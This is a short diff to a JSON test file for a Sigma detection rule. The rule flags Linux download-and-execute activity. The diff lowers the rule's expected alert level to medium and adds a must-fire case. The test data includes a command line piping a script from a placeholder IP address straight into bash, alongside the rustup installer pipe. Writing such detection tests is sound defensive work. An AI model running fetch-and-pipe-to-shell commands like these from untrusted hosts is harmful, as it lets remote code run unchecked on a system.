@@ -1025,13 +1025,21 @@
   {
     "id": "linux_download_exec",
     "file": "rules/sigma/linux_download_exec.yml",
-    "expected_level": "high",
+    "expected_level": "medium",
     "must_fire": [
       [
         {
           "class": "process_exec",
           "process": "sh",
           "cmdline": "sh -c 'curl -s http://203.0.113.9/x.sh | bash'"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "sh",
+          "parent": "bash",
+          "cmdline": "sh -c 'curl https://sh.rustup.rs -sSf | sh'"
         }
       ]
     ],
